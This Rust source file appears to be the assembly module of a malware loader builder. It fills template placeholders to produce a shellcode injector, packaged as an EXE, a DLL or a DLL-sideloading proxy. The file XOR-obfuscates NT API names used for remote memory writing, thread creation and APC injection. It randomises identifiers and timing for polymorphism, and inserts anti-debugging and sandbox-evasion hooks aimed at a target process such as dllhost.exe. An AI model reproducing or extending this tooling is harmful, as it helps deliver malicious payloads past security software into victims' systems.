use crate::order::{Order, OutputFormat};
use crate::polymorph::Polymorph;
use crate::sideload;
use crate::techniques::{self, BuildContext, Category};
use fs_extra::dir::{copy, CopyOptions};
use std::collections::HashMap;
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

const OUTPUT_DIR: &str = "shared";

fn obfuscate_api_name(name: &str, key: u8) -> String {
    let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
    format!("[{}]", bytes.join(", "))
}

fn search_and_replace(path: &Path, search: &str, replace: &str) -> Result<(), Box<dyn std::error::Error>> {
    let file_content = fs::read_to_string(path)?;
    let new_content = file_content.replace(search, replace);
    let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
    file.write_all(new_content.as_bytes())?;
    Ok(())
}

fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    // ms timestamp + counter so parallel assemble() calls never collide.
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let ts_ms = SystemTime::now().duration_since(UNIX_EPOCH)?.as_millis();
    let seq = SEQ.fetch_add(1, Ordering::Relaxed);
    let folder_name = format!("output_{}_{:04x}", ts_ms, seq);
    crate::blog!("[+] Creating output folder: {}", &folder_name);
    let result_path = parent.join(folder_name);
    fs::create_dir_all(&result_path)?;
    Ok(result_path)
}

fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let options = CopyOptions { content_only: true, ..Default::default() };
    copy(source, dest, &options)?;
    Ok(())
}

fn default_replacements(order: &Order, polymorph: &mut Polymorph) -> HashMap<&'static str, String> {
    let mut r: HashMap<&'static str, String> = HashMap::new();
    r.insert("{{TARGET_PROCESS}}", "dllhost.exe".to_string()); // overwritten by injection.apply()
    r.insert("{{SANDBOX}}", String::new());
    r.insert("{{SANDBOX_IMPORTS}}", String::new());
    r.insert("{{DLL_MAIN}}", String::new());
    r.insert("{{DLL_FORMAT}}", String::new());
    r.insert("{{INJECTION_HELPERS}}", String::new());
    r.insert("{{CALLBACK_INVOKE}}", String::new());

    // nt_delay evasion placeholders — empty unless the evasion is enabled.
    r.insert("{{NT_DELAY_AT_START}}", String::new());
    r.insert("{{NT_DELAY_STEP}}", String::new());
    r.insert("{{NT_DELAY_FINAL}}", String::new());

    let api_key = polymorph.api_key();
    r.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
    r.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", api_key));
    r.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", api_key));
    r.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", api_key));
    r.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", api_key));
    r.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", api_key));
    r.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", api_key));
    r.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", api_key));
    r.insert("{{OBF_NT_DELAY_EXECUTION}}", obfuscate_api_name("NtDelayExecution", api_key));

    let fn_find_pid     = polymorph.random_ident("find_pid");
    let fn_inject       = polymorph.random_ident("inject");
    let fn_pause        = polymorph.random_ident("pause");
    let fn_cascade      = polymorph.random_ident("cascade");
    let fn_enc_ptr      = polymorph.random_ident("enc_ptr");
    let fn_ev_debugport = polymorph.random_ident("ev_dp");
    let fn_ev_chkremote = polymorph.random_ident("ev_cr");
    let fn_ev_teb       = polymorph.random_ident("ev_teb");
    let fn_ev_vec_int3  = polymorph.random_ident("ev_v3");
    let fn_ev_domain    = polymorph.random_ident("ev_dom");
    let fn_resolver     = polymorph.random_ident("g");
    let fn_decoder      = polymorph.random_ident("d");

    r.insert("{{FN_FIND_PID}}",             fn_find_pid);
    r.insert("{{FN_INJECT}}",               fn_inject);
    r.insert("{{FN_PAUSE}}",                fn_pause.clone());
    r.insert("{{FN_CASCADE}}",              fn_cascade);
    r.insert("{{FN_ENC_PTR}}",              fn_enc_ptr);
    r.insert("{{FN_EVASION_DEBUG_PORT}}",   fn_ev_debugport);
    r.insert("{{FN_EVASION_CHECK_REMOTE}}", fn_ev_chkremote);
    r.insert("{{FN_EVASION_TEB}}",          fn_ev_teb);
    r.insert("{{FN_EVASION_VEC_INT3}}",     fn_ev_vec_int3);
    r.insert("{{FN_EVASION_DOMAIN}}",       fn_ev_domain);
    r.insert("{{FN_RESOLVER}}",             fn_resolver.clone());
    r.insert("{{FN_DECODER}}",              fn_decoder.clone());

    r.insert("{{JITTER_1}}", polymorph.jitter(150, 25).to_string());
    r.insert("{{JITTER_2}}", polymorph.jitter(200, 25).to_string());
    r.insert("{{JITTER_3}}", polymorph.jitter(150, 25).to_string());
    r.insert("{{JITTER_4}}", polymorph.jitter(100, 25).to_string());

    let put_str = |r: &mut HashMap<&'static str, String>, key: &'static str, plain: &[u8]| {
        let parts: Vec<String> = plain.iter().map(|b| format!("0x{:02x}", b ^ api_key)).collect();
        r.insert(key, format!("[{}]", parts.join(", ")));
    };
    put_str(&mut r, "{{STR_NTDLL}}",                  b"ntdll.dll\0");
    put_str(&mut r, "{{STR_NTDLL_SHORT}}",            b"ntdll\0");
    put_str(&mut r, "{{STR_KERNEL32}}",               b"kernel32.dll\0");
    put_str(&mut r, "{{STR_NTQUERYINFO}}",            b"NtQueryInformationProcess\0");
    put_str(&mut r, "{{STR_CHECK_REMOTE_DBG}}",       b"CheckRemoteDebuggerPresent\0");
    put_str(&mut r, "{{STR_GET_COMPUTER_NAME_EX_W}}", b"GetComputerNameExW\0");
    put_str(&mut r, "{{STR_ADD_VEH}}",                b"AddVectoredExceptionHandler\0");
    put_str(&mut r, "{{STR_REMOVE_VEH}}",             b"RemoveVectoredExceptionHandler\0");

    // Bake the chosen ident names into the blocks here. The substitution
    // pass would otherwise depend on HashMap iteration order to resolve
    // {{FN_DECODER}} / {{FN_RESOLVER}} that live inside these strings.
    r.insert("{{STR_DECODER}}", format!(
r#"#[inline(always)]
fn {decoder}(src: &[u8]) -> Vec<u8> {{
    src.iter().map(|b| b ^ 0x{key:02x}u8).collect()
}}"#, decoder = fn_decoder, key = api_key));

    r.insert("{{API_RESOLVER}}", format!(
r#"#[inline(always)]
unsafe fn {resolver}<F: Sized>(modname: &[u8], procname: &[u8]) -> Option<F> {{
    extern "system" {{
        fn GetModuleHandleA(name: *const i8) -> *mut core::ffi::c_void;
        fn GetProcAddress(h: *mut core::ffi::c_void, name: *const i8)
            -> *mut core::ffi::c_void;
    }}
    let dec_m = {decoder}(modname);
    let dec_p = {decoder}(procname);
    let h = GetModuleHandleA(dec_m.as_ptr() as *const i8);
    if h.is_null() {{ return None; }}
    let p = GetProcAddress(h, dec_p.as_ptr() as *const i8);
    if p.is_null() {{ return None; }}
    Some(core::mem::transmute_copy(&p))
}}"#, resolver = fn_resolver, decoder = fn_decoder));

    let _ = order;
    r
}

fn apply_dll_format(replacements: &mut HashMap<&'static str, String>, main_rs_path: &Path) -> PathBuf {
    let dll_cargo_conf = "[lib]\ncrate-type = [\"cdylib\"]";
    replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());

    let dll_main_fn = r#"
const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

#[no_mangle]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
extern "system" fn DllMain(dll_module: usize, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => (),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    true
}
#[no_mangle] pub extern "C" fn DllRegisterServer()   { main() }
#[no_mangle] pub extern "C" fn DllGetClassObject()   { main() }
#[no_mangle] pub extern "C" fn DllUnregisterServer() { main() }
#[no_mangle] pub extern "C" fn Run()                 { main() }
"#;
    replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
        panic!("Error while renaming main.rs to lib.rs: {}", e);
    }
    lib_rs_path
}

/// DllSideload format: the chosen self-injection technique's `main()` becomes the body
/// of the hijacked export. DllMain is a passthrough. Proxy mode forwards non-hijacked
/// exports to the original DLL via a `.def` file.
fn apply_sideload_format(
    replacements: &mut HashMap<&'static str, String>,
    main_rs_path: &Path,
    folder: &Path,
    config: &crate::order::SideloadConfig,
) -> PathBuf {
    if let Err(e) = sideload::apply(config, folder, replacements) {
        panic!("Sideload generation failed: {e}");
    }

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
        panic!("Error while renaming main.rs to lib.rs: {}", e);
    }
    lib_rs_path
}

fn apply_replacements_once(replacements: &HashMap<&'static str, String>, main_path: &Path, cargo_path: &Path) {
    for (key, value) in replacements {
        search_and_replace(main_path, key, value)
            .unwrap_or_else(|e| crate::blog!("[!] Warning: template replace failed for {}: {}", key, e));
        search_and_replace(cargo_path, key, value)
            .unwrap_or_else(|e| crate::blog!("[!] Warning: cargo replace failed for {}: {}", key, e));
    }

    let Some(src_dir) = main_path.parent() else { return };
    let Ok(entries) = fs::read_dir(src_dir) else { return };
    for entry in entries.flatten() {
        let path = entry.path();
        if path == main_path {
            continue;
        }
        if path.extension().and_then(|s| s.to_str()) != Some("rs") {
            continue;
        }
        for (key, value) in replacements {
            search_and_replace(&path, key, value)
                .unwrap_or_else(|e| crate::blog!("[!] Warning: template replace failed for {} in {}: {}", key, path.display(), e));
        }
    }
}

fn apply_replacements(replacements: &HashMap<&'static str, String>, main_path: &Path, cargo_path: &Path) {
    // Two passes. {{SANDBOX}} expands to a snippet that contains other
    // {{...}} placeholders, and HashMap iteration order is unspecified.
    apply_replacements_once(replacements, main_path, cargo_path);
    apply_replacements_once(replacements, main_path, cargo_path);
}

pub fn assemble(order: Order) -> PathBuf {
    crate::blog!("[+] Assembling Rust code..");
    crate::blog!("[+] Build seed: 0x{:016x}", order.seed.0);

    let folder = create_root_folder(Path::new(OUTPUT_DIR)).expect("Failed to create output folder");
    let src_dir = folder.join("src");

    let mut polymorph = Polymorph::from_seed(order.seed);
    let replacements = default_replacements(&order, &mut polymorph);

    let mut ctx = BuildContext {
        shellcode_path: &order.shellcode_path,
        output_folder: folder.clone(),
        src_dir: src_dir.clone(),
        replacements,
        template_choice: None,
        params: &order.params,
        polymorph,
    };

    // 1. Injection technique picks the template + sets target_process.
    let inj = techniques::find(&order.injection_id)
        .unwrap_or_else(|| panic!("unknown injection: {}", order.injection_id));
    inj.apply(&mut ctx).expect("injection apply failed");

    let template_name = ctx.template_choice.expect("injection did not set template");
    let template_path = PathBuf::from("templates").join(template_name).join(".");
    copy_template(&template_path, &folder).expect("Failed to copy template");

    if template_name == "ntEarlyCascade" {
        if let Err(e) = crate::earlycascade_emit::rewrite_stubs(&folder, &mut ctx.polymorph) {
            crate::blog!("[!] EarlyCascade stub rewrite failed: {e}");
        }
    }

    // 2. Encryption technique writes the encrypted file + decryption replacements.
    let enc = techniques::find(&order.encryption_id)
        .unwrap_or_else(|| panic!("unknown encryption: {}", order.encryption_id));
    enc.apply(&mut ctx).expect("encryption apply failed");

    // 3. Each enabled evasion technique adds its replacements.
    for ev_id in &order.evasions {
        let ev = techniques::find(ev_id)
            .unwrap_or_else(|| panic!("unknown evasion: {}", ev_id));
        ev.apply(&mut ctx).expect("evasion apply failed");
    }

    let main_rs = src_dir.join("main.rs");
    let cargo_toml = folder.join("Cargo.toml");

    let target_file = match order.format {
        OutputFormat::Exe => main_rs,
        OutputFormat::Dll => apply_dll_format(&mut ctx.replacements, &main_rs),
        OutputFormat::DllSideload => {
            let config = order
                .sideload
                .as_ref()
                .expect("DllSideload format requires a SideloadConfig in the Order");
            apply_sideload_format(&mut ctx.replacements, &main_rs, &folder, config)
        }
    };

    apply_replacements(&ctx.replacements, &target_file, &cargo_toml);

    // Sanity check
    let _ = Category::Encryption; // imported above, ensures `techniques` is in scope

    crate::blog!("[+] Done assembling Rust code!");
    folder
}
